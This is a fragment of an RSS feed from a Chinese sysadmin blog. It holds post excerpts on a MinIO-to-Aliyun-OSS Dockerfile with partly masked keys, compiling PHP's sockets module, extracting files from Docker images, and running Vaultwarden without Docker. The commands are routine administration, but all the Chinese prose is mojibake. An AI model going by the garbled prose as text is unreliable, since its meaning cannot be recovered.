&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é—®é¢˜åˆæ¥äº†ï¼Œæ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 çš„è·¯å¾„éå¸¸é•¿ï¼Œè€Œæ–‡ä»¶ä¸ªæ•°ä¸å®šï¼Œæœ‰æ’‘çˆ†å‘½ä»¤è¡Œå•è¡Œé•¿åº¦é™åˆ¶çš„å¯èƒ½ï¼Œä¹Ÿä¸å¯è¡Œ&lt;/p&gt;
&lt;h2 id=&#34;ä¸‰tc&#34;&gt;ä¸‰ã€tc&lt;/h2&gt;
&lt;p&gt;ä½¿ç”¨ tc å¯ä»¥æ§åˆ¶æºipæˆ–è€…ç›®çš„ipçš„å¸¦å®½ï¼Œä½†æ˜¯æœ¬æœºç½‘å¡æ˜¯ä¸‡å…†å…‰å¡ï¼Œç”Ÿäº§ç¯å¢ƒï¼Œæ¯æ—¶æ¯åˆ»éƒ½æœ‰æ•°æ®è¯»å†™ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€æ—¦é”™äº†ï¼Œå°±ç›´æ¥å®Œè›‹äº†ã€‚ä¹Ÿä¸å¤ªå¯è¡Œ&lt;/p&gt;
&lt;h2 id=&#34;å››æ€å™¨trickle&#34;&gt;å››ã€æ€å™¨trickle&lt;/h2&gt;
&lt;p&gt;å¯»æ‰¾äº†åŠå¤©ï¼Œç»ˆäºæ‰¾åˆ°äº†ä¸ªå¤§æ€å™¨trickleï¼Œå¯ä»¥å¯¹ç¨‹åºå•ç‹¬é™é€Ÿï¼Œä¹Ÿå¯ä»¥å¯¹ä¸€å †ç¨‹åºæ•´ä½“é™é€Ÿ&lt;/p&gt;
&lt;p&gt;å®‰è£…ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dockerfileçš„ç¼–å†™ä¸è°ƒè¯•æŠ€å·§</title>
      <link>https://rendoumi.com/posts/20211028-dockerfile/</link>
      <pubDate>Thu, 28 Oct 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211028-dockerfile/</guid>
      <description>&lt;p&gt;Dockerfile æ˜¯é€ å‡ºé•œåƒçš„åŸºç¡€ï¼Œæ˜¯å¿…é¡»ç†ŸçŸ¥å¹¶äº†è§£çš„çŸ¥è¯†ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ç¼–å†™dockerfile&#34;&gt;ä¸€ã€ç¼–å†™Dockerfile&lt;/h2&gt;
&lt;p&gt;å…ˆç»™ä¸ªä¾‹å­ï¼Œæ˜¯ minio ä»£ç†è®¿é—®é˜¿é‡Œçš„ OSS&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;FROM alpine:3.12 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;RUN apk add --update bash &amp;amp;&amp;amp; rm -rf /var/cache/apk/*  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;COPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ENV MINIO_ACCESS_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;LTAI5tFFTbsxxxxxuLb  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ENV MINIO_SECRET_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;t78PyGnHZilxxxxxdxBCjvNgtVC5Y  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;WORKDIR /data  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;EXPOSE 9000  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;CMD [&amp;#34;/data/minio.RELEASE.2020-04-15T19-42-18Z&amp;#34;,&amp;#34;gateway&amp;#34;,&amp;#34;oss&amp;#34;,&amp;#34;http://oss-cn-shanghai-internal.aliyuncs.com&amp;#34;] &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# CMD /bin/sh -c &amp;#34;while true; do echo hi; sleep 10; done&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;è¯¦ç»†è§£é‡Šæ¯ä¸€æ¡è¯­å¥ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;FROM&lt;/p&gt;
&lt;p&gt;åŸºæ¿ï¼Œalpine 3.12 æ˜¯ä¸ªæ¯”è¾ƒå¾®å°çš„ç‰ˆæœ¬ï¼Œæ³¨æ„å®ƒçš„æ¯›ç—…ï¼Œ/bin/shå…¶å®æ˜¯busyboxï¼Œæ²¡æœ‰/bin/bashï¼ŒæŸäº›bashçš„å‡½æ•°åŠŸèƒ½æ”¯æŒä¸å…¨ï¼Œæ¯”å¦‚forå¾ªç¯&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RUN&lt;/p&gt;
&lt;p&gt;åœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤ï¼Œä¸Šä¾‹ä¸­æˆ‘ä»¬æ·»åŠ äº† bash ï¼Œå¹¶æ¸…ç†äº†ç¼“å­˜ã€‚å‘½ä»¤é—´ç”¨ &amp;amp;&amp;amp; å¯ä»¥é¿å…é•œåƒè¿‡å¤šåˆ†å±‚ã€‚&lt;/p&gt;
&lt;p&gt;RUNåˆ†ä¸¤ç§æ¨¡å¼shellå’Œexecæ¨¡å¼:&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åªç”¨ exec æ¨¡å¼ï¼Œå› ä¸ºåœ¨ image é‡Œè£…å…¥å¤šä¸ª shellï¼Œæ²¡ä»€ä¹ˆæ„ä¹‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;COPY å’Œ ADD&lt;/p&gt;</description>
    </item>
    <item>
      <title>PHPç¨‹åºå¦‚ä½•å‘é€syslogåˆ°è¿œç¨‹æœåŠ¡å™¨</title>
      <link>https://rendoumi.com/posts/20211028-php_syslog/</link>
      <pubDate>Thu, 28 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211028-php_syslog/</guid>
      <description>&lt;p&gt;ç»™åŒäº‹åšäº†ä¸ª PHP æ¥å£ï¼Œè½¬å‘å‘é€çŸ­ä¿¡çš„è¯·æ±‚ï¼ŒåŒæ—¶è¦æŠŠå‘é€è®°å½•å‘é€åˆ°è¿œç¨‹çš„ cacti çš„ syslog å»&lt;/p&gt;
&lt;p&gt;å¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿä¸ç®€å•&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜¯ PHP æœåŠ¡å™¨ï¼Œæ˜¯æœ€ç®€åŒ–ç¼–è¯‘çš„ï¼Œphp  -m æŸ¥äº†ä¸€ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;php -m&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[PHP Modules]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;Core&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ctype&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;curl&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;date&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;dom&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fileinfo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;filter&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;gettext&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;hash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iconv&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;json&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;libxml&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;openssl&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;pcre&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;PDO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;pdo_sqlite&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;Phar&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;posix&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;Reflection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;SimpleXML&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;SPL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;sqlite3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;standard&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;tokenizer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;xml&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;xmlreader&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;xmlwriter&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[Zend Modules]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å±…ç„¶æ²¡æœ‰ socket æ¨¡å—ï¼Œæ²¡åŠæ³•ï¼Œæ‰¾åˆ°æºä»£ç ï¼Œç¼–è¯‘ä¸€ä¸ªå®‰è£…ï¼ŒåŸæœ‰çš„ php å®‰è£…è·¯å¾„æ˜¯ /export/servers/php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ tar zxvf php-7.4.0.tar.gz 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; php-7.4.0/sockets
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ /export/servers/php/bin/phpize
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./configure --enable-sockets --with-php-config&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/servers/php/bin/php-config
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ make
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆçœ‹äº†ä¸€çœ¼ï¼Œæ˜¯ php-fpmï¼Œå±…ç„¶æ²¡æœ‰ php.ini ï¼Œå¾—ï¼Œå†ç”Ÿæˆä¸€ä¸ªï¼Œæ”¾åœ¨ /export/servers/php/lib/php.ini&lt;/p&gt;</description>
    </item>
    <item>
      <title>æ²¡æœ‰è£…Dockerå¦‚ä½•ä»é•œåƒä¸­é‡Šæ”¾å‡ºæ–‡ä»¶</title>
      <link>https://rendoumi.com/posts/20211027-docker_extract_file/</link>
      <pubDate>Wed, 27 Oct 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211027-docker_extract_file/</guid>
      <description>&lt;p&gt;ç”¨ kubernetes è¶Šå¤šï¼Œç”¨ docker è¶Šå¤šï¼Œå°±æ„ˆå‘æ„Ÿè§‰åˆ°å¥½å¤„å¤šå¤šã€‚&lt;/p&gt;
&lt;p&gt;ç®€ç®€å•å•çš„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç”¨ docker åŸºæ¿ alphine å°è£…ï¼Œå°±å¯ä»¥è¿è¡Œèµ·ä¸€ä¸ª pod ï¼Œç„¶åæŒ‡å®š deploymentã€svcã€ingressï¼Œå°±å¯ä»¥å°†æœåŠ¡æš´éœ²å‡ºå»ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®å¾ˆå¤šæƒ…å†µä¸‹å•å¯æ‰§è¡Œæ–‡ä»¶ + systemdä¹Ÿæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸å°±é‡åˆ°ä¸ªé—®é¢˜ï¼Œghostunnel è¿™ä¸ªè½¯ä»¶ï¼Œgithub åªé‡Šæ”¾å‡ºäº†æºä»£ç ä»¥åŠ windows ã€linux å’Œ mac çš„ä¸‰ä¸ªå¯æ‰§è¡Œç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;å¯æˆ‘çš„æ‰§è¡Œç¯å¢ƒæ˜¯ nanopi ï¼Œæ˜¯ä¸ª arm7 çš„æ¶æ„ï¼Œå°±æ— è®¡å¯æ–½äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ— å¥ˆä¸‹ï¼Œåœ¨ nanopi ä¸Šè£…äº† go ï¼Œç¼–è¯‘äº†ä¸ª arm7 çš„å‡ºæ¥ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯é‡åˆ° vaultwanden ï¼Œrust çš„ï¼Œå°±æ²¡æ³•å¼„äº†ï¼Œvps å¤ªå¼±ï¼Œæ ¹æœ¬æ— æ³•ç”¨ cargo ç¼–è¯‘ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æ€ä¹ˆåŠå‘¢ï¼Ÿæ–¹æ³•å¦‚ä¸‹ï¼Œä¸å®‰è£… Docker ï¼Œä¹Ÿå¯ä»¥æŠŠé•œåƒä¸­çš„æ–‡ä»¶æŠ½å–å‡ºæ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ mkdir vm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ wget https://raw.githubusercontent.com/jjlin/docker-image-extract/main/docker-image-extract
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ chmod +x docker-image-extract
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./docker-image-extract vaultwarden/server:alpine
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Getting API token...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Getting image manifest &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; vaultwarden/server:alpine...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Fetching and extracting layer a0d0a0d46f8b52473982a3c466318f479767577551a53ffc9074c9fa7035982e...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Fetching and extracting layer 3a9a529931676767ec84d35ab19774b24bd94e20f6fff7e6bda57ef5f2a66cfc...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Fetching and extracting layer f9dcfa9aefe67ce52ab2a73e515ea715d242348b8fc338dbe4ca72a853ea0318...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Fetching and extracting layer 4249d8cece35148b5faca2c6a98d566a271a1996b127b14480793ee8825e43c0...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Fetching and extracting layer 72f4873a62cc82eaf28905077df3791e3b235bf5d17670e7aff6d5fb5e280739...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Fetching and extracting layer 8eb772c524f9d998c8c7c92acc5ba96e3e9ebfb175dbb2441fe6e7b7598874f5...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Fetching and extracting layer 663794f103b44abb8a90e1376dce14735905e2f938b4ca7e0ff379b09cbf6148...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Image contents extracted into ./output.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ output ç›®å½•ä¸‹å¾—åˆ° vaultwarden å’Œ web-vault&lt;/p&gt;</description>
    </item>
    <item>
      <title>Bitwardenï¼ˆvaultwardenï¼‰å¦‚ä½•åœ¨éDockerç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20211027-bitwarden/</link>
      <pubDate>Wed, 27 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211027-bitwarden/</guid>
      <description>&lt;p&gt;ä¸ºä»€ä¹ˆä¼šæœ‰é Docker ç¯å¢ƒè¿™ä¸ªæ€ªå­—çœ¼å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ— ä»–ï¼Œå› ä¸ºæ»¡ç½‘æœç´¢åˆ°çš„æ•™ç¨‹éƒ½æ˜¯åœ¨ Docker ç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ç©·å•Šï¼Œå…«æˆ’çš„ vps æ˜¯ä¸ªå•æ ¸ 500m çš„ justhost æœºå™¨ï¼Œä¾¿å®œçš„å¾ˆï¼Œè¿™ç§å»‰ä»·æœºå™¨æ¥è·‘ Dockerï¼ŒåŸºæœ¬è¦å 100Mï¼Œè·‘ä¸å¤ªåŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ç§ä¸€ç©·äºŒç™½çš„ç¯å¢ƒï¼Œå°±åªèƒ½æŠŠ Bitwarden ä»å®¹å™¨é‡Œæ‹†å‡ºæ¥ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;å¥½åœ¨ Bitwarden_rs æ˜¯ä¸€ä¸ª rust ç¨‹åºï¼Œå å†…å­˜(16Må·¦å³)å’Œcpuæå°‘ï¼Œæœ¬èº«å°±é€‚åˆåœ¨ systemd ç¯å¢ƒä¸‹è·‘ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œå°±åˆ©ç”¨ vaultwarden å’Œ traefikï¼Œåœ¨ä¸€å°è€ç ´å°æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚&lt;/p&gt;
&lt;p&gt;ç³»ç»Ÿç¯å¢ƒæ˜¯ CentOS 7.9&lt;/p&gt;
&lt;p&gt;æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ä¸‹è½½bitwardenvaultwarden&#34;&gt;ä¸€ã€ä¸‹è½½bitwarden(vaultwarden)&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/dani-garcia/vaultwarden/archive/refs/tags/1.23.0.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒå®‰è£…cargoå¹¶ç¼–è¯‘å¯é€‰&#34;&gt;äºŒã€å®‰è£…cargoå¹¶ç¼–è¯‘ï¼ˆå¯é€‰ï¼‰&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y openssl-devel cargo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; vaultwarden-1.23.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cargo build --release --features sqlite
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç›´æ¥çˆ†é”™å•Šï¼Œå°å°çš„ vps è¿ç¼–è¯‘éƒ½è¿‡ä¸å»ï¼Œç¼–è¯‘è¿›ç¨‹éƒ½è¢« kill æ‰äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211027144917206&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211027-bitwarden/image-20211027144917206.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ä¸‰ä¸‹è½½vaultwardenä¸»æ–‡ä»¶&#34;&gt;ä¸‰ã€ä¸‹è½½vaultwardenä¸»æ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;ç¼–è¯‘ä¸é€šï¼Œå°±åªèƒ½æƒ³åˆ«çš„åŠæ³•äº†ã€‚Faint&lt;/p&gt;
&lt;p&gt;æ‰¾ä¸€å°æœ‰ docker æœºå™¨ï¼Œä»é‡Œé¢æŠŠæ–‡ä»¶éƒ½è§£æå‡ºæ¥å¥½äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker pull vaultwarden/server:alpine
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker create --name vw vaultwarden/server:alpine
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker cp vw:/vaultwarden .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker cp vw:/web-vault .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker rm vw
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·ä¼šå¾—åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ vaultwarden å’Œä¸€ä¸ªç›®å½• web-vault&lt;/p&gt;</description>
    </item>
    <item>
      <title>é˜¿é‡Œäº‘ACKå®Œå…¨ç”Ÿäº§ç¯å¢ƒè§„åˆ’å’Œæ­å»º</title>
      <link>https://rendoumi.com/posts/20211026-ack_build/</link>
      <pubDate>Tue, 26 Oct 2021 09:30:11 +0800</pubDate>
